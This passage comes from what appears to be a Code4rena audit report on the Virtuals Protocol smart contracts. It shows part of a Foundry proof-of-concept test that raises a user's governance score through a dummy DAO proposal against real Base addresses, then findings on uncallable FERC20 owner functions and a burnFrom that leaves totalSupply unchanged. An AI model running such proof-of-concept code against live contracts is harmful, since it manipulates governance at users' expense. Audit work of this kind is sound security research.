<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">projectTaxPendingSwap</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">projectTaxRecipient</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setProjectTaxRecipient</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">projectTaxRecipient_</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1">; </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setSwapThresholdBasisPoints</span><span class="mtk1">(</span><span class="mtk12">uint16</span><span class="mtk1"> </span><span class="mtk12">swapThresholdBasisPoints_</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setProjectTaxRates</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint16</span><span class="mtk1"> </span><span class="mtk12">newProjectBuyTaxBasisPoints_</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint16</span><span class="mtk1"> </span><span class="mtk12">newProjectSellTaxBasisPoints_</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IAgentDAO</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">propose</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">targets</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">values</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bytes</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">calldatas</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">description</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">castVote</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1">, </span><span class="mtk12">uint8</span><span class="mtk1"> </span><span class="mtk12">support</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">scoreOf</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">account</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">contract</span><span class="mtk1"> </span><span class="mtk12">DummyProposalPOC</span><span class="mtk1"> </span><span class="mtk12">is</span><span class="mtk1"> </span><span class="mtk12">Test</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">IAgentToken</span><span class="mtk1"> </span><span class="mtk12">agentToken</span><span class="mtk1"> = </span><span class="mtk11">IAgentToken</span><span class="mtk1">(</span><span class="mtk7">0x1C4CcA7C5DB003824208aDDA61Bd749e55F463a3</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">IAgentDAO</span><span class="mtk1"> </span><span class="mtk12">agentDAO</span><span class="mtk1"> = </span><span class="mtk11">IAgentDAO</span><span class="mtk1">(</span><span class="mtk7">0x98cb03B06a91e32c45F4173E290732Dc4a8F41c1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">BASE_RPC_URL</span><span class="mtk1"> = </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">envString</span><span class="mtk1">(</span><span class="mtk8">"BASE_RPC_URL"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">user</span><span class="mtk1"> = </span><span class="mtk11">makeAddr</span><span class="mtk1">(</span><span class="mtk8">"user"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setUp</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">forkId</span><span class="mtk1"> = </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">createFork</span><span class="mtk1">(</span><span class="mtk12">BASE_RPC_URL</span><span class="mtk1">, </span><span class="mtk7">29_225_700</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">selectFork</span><span class="mtk1">(</span><span class="mtk12">forkId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">test_dummy_proposal_to_increase_score</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Setup proposal and propose</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">targets</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">address</span><span class="mtk1">[](</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">targets</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">agentToken</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">values</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">uint256</span><span class="mtk1">[](</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">values</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk7">0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bytes</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">calldatas</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">bytes</span><span class="mtk1">[](</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">calldatas</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk12">abi</span><span class="mtk1">.</span><span class="mtk11">encodeWithSelector</span><span class="mtk1">(</span><span class="mtk12">IAgentToken</span><span class="mtk1">.</span><span class="mtk12">distributeTaxTokens</span><span class="mtk1">.</span><span class="mtk12">selector</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">description</span><span class="mtk1"> = </span><span class="mtk8">"Test Proposal"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1"> = </span><span class="mtk12">agentDAO</span><span class="mtk1">.</span><span class="mtk11">propose</span><span class="mtk1">(</span><span class="mtk12">targets</span><span class="mtk1">, </span><span class="mtk12">values</span><span class="mtk1">, </span><span class="mtk12">calldatas</span><span class="mtk1">, </span><span class="mtk12">description</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">roll</span><span class="mtk1">(</span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">number</span><span class="mtk1"> + </span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">assertEq</span><span class="mtk1">(</span><span class="mtk12">agentDAO</span><span class="mtk1">.</span><span class="mtk11">scoreOf</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1">), </span><span class="mtk7">0</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">agentDAO</span><span class="mtk1">.</span><span class="mtk11">castVote</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">, </span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">assertEq</span><span class="mtk1">(</span><span class="mtk12">agentDAO</span><span class="mtk1">.</span><span class="mtk11">scoreOf</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1">), </span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<hr>
<h2 style="position:relative;" id="m-09-functions-in-ferc20-cant-be-invoked"><a class="anchor before" aria-label="m 09 functions in ferc20 cant be invoked permalink" href="#m-09-functions-in-ferc20-cant-be-invoked"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-37">[M-09] Functions in FERC20 can’t be invoked</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-428">EPSec</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-814">io10</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-544">LeoGold</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-731">oakcobalt</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FERC20.sol#L121-L129">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FERC20.sol#L121-L129</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-1"><a class="anchor before" aria-label="finding description and impact 1 permalink" href="#finding-description-and-impact-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding Description and Impact</h3>
<p>In the <code>FERC20</code> contract, there are two functions restricted to be called only by the owner of the token: <code>updateMaxTx</code> and <code>excludeFromMaxTx</code>. These functions are crucial for managing transaction limits and exclusions for specific addresses. However, an issue arises as the owner of the token is the <code>Bonding</code> contract, which does not expose these functions externally. As a result, no one can call these functions, preventing the update of transaction limits or exclusions.</p>
<p>Here is the relevant code snippet from the contract:</p>
<pre data-index="59" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">updateMaxTx</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">_maxTx</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_updateMaxTx</span><span class="mtk1">(</span><span class="mtk12">_maxTx</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">excludeFromMaxTx</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">user</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"ERC20: Exclude Max Tx from the zero address"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">isExcludedFromMaxTx</span><span class="mtk1">[</span><span class="mtk12">user</span><span class="mtk1">] = </span><span class="mtk4">true</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<h3 style="position:relative;" id="impact-8"><a class="anchor before" aria-label="impact 8 permalink" href="#impact-8"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact:</h3>
<ul>
<li><strong>Transaction Limit Issues:</strong> The inability to update the maximum transaction limit leaves the contract inflexible in adapting to changes in market conditions or governance decisions.</li>
<li><strong>Exclusion Issues:</strong> Certain addresses that should be exempt from transaction limits cannot be excluded, limiting the ability to manage token holders effectively.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-14"><a class="anchor before" aria-label="recommended mitigation steps 14 permalink" href="#recommended-mitigation-steps-14"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Modify the <code>Bonding</code> contract to include wrapper functions that externally call <code>updateMaxTx</code> and <code>excludeFromMaxTx</code> for the owner. This ensures these functions are accessible for updates and exclusions.</p>
<pre data-index="60" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">updateMaxTxForOwner</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">_maxTx</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">updateMaxTx</span><span class="mtk1">(</span><span class="mtk12">_maxTx</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">excludeFromMaxTxForOwner</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">user</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">excludeFromMaxTx</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<hr>
<h2 style="position:relative;" id="m-10-missing-totalsupply-reduction-in-burnfrom-allows-supply-manipulation-erc20-violation"><a class="anchor before" aria-label="m 10 missing totalsupply reduction in burnfrom allows supply manipulation erc20 violation permalink" href="#m-10-missing-totalsupply-reduction-in-burnfrom-allows-supply-manipulation-erc20-violation"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-41">[M-10] Missing <code>totalSupply</code> reduction in <code>burnFrom</code> allows supply manipulation (ERC20 Violation)</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-56">Agrawain</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-542">0x60scs</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-607">bareli</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-218">cerweb10</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-450">CompetSlayer</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-716">DanielTan_MetaTrust</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-777">edoscoba</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-425">EPSec</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-825">Rorschach</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-754">Silverwind</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-670">unique</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-686">X-Tray03</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FERC20.sol#L136">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FERC20.sol#L136</a></p>
<h3 style="position:relative;" id="finding-description-5"><a class="anchor before" aria-label="finding description 5 permalink" href="#finding-description-5"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>burnFrom</code> (address user, uint256 amount) function in the FERC20 contract allows the owner to decrease a user’s balance and emit a Transfer (user, <code>address(0)</code>, amount) event — simulating a burn. However, it fails to reduce the <code>_totalSupply</code> variable. This violates the ERC20 standard and creates an inconsistency between on-chain total supply and actual circulating tokens.</p>
<h3 style="position:relative;" id="impact-9"><a class="anchor before" aria-label="impact 9 permalink" href="#impact-9"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>This vulnerability has significant consequences:</p>
<ul>
<li><strong>ERC20 Standard Violation:</strong> Tools, protocols, and dApps relying on <code>totalSupply()</code> will receive incorrect data.</li>
<li><strong>Market Cap Manipulation:</strong> Since market cap is often calculated as <code>price * totalSupply</code>, an attacker can make the market cap appear larger than reality, misleading investors and platforms.</li>
<li><strong>DeFi Exploits:</strong> Protocols that distribute rewards or voting power proportionally to <code>totalSupply</code> or <code>balance/totalSupply</code> ratios may be gamed.</li>
<li><strong>False Burn Signals:</strong> The Transfer event to the zero address signals a burn, while the tokens still exist in the <code>totalSupply</code>, creating a false narrative of scarcity.</li>
<li><strong>Centralization Risk:</strong> The owner can arbitrarily remove user balances (burn) while keeping <code>totalSupply</code> unchanged, retaining apparent token value but harming users.</li>
</ul>
<p>This combination creates both economic manipulation risk and false transparency, which can impact DeFi, governance, analytics, and user trust.</p>
<h3 style="position:relative;" id="proof-of-concept-11"><a class="anchor before" aria-label="proof of concept 11 permalink" href="#proof-of-concept-11"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<pre data-index="61" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// Run Test</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">npx</span><span class="mtk1"> </span><span class="mtk12">hardhat</span><span class="mtk1"> </span><span class="mtk12">test</span><span class="mtk1"> </span><span class="mtk12">test</span><span class="mtk1">/</span><span class="mtk12">exploits</span><span class="mtk1">/</span><span class="mtk12">FERC20</span><span class="mtk1">.</span><span class="mtk12">js</span></span></span></code></pre>
<pre data-index="62" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// POC</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">const</span><span class="mtk1"> { </span><span class="mtk12">expect</span><span class="mtk1"> } = </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk8">"chai"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">const</span><span class="mtk1"> { </span><span class="mtk12">ethers</span><span class="mtk1"> } = </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk8">"hardhat"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
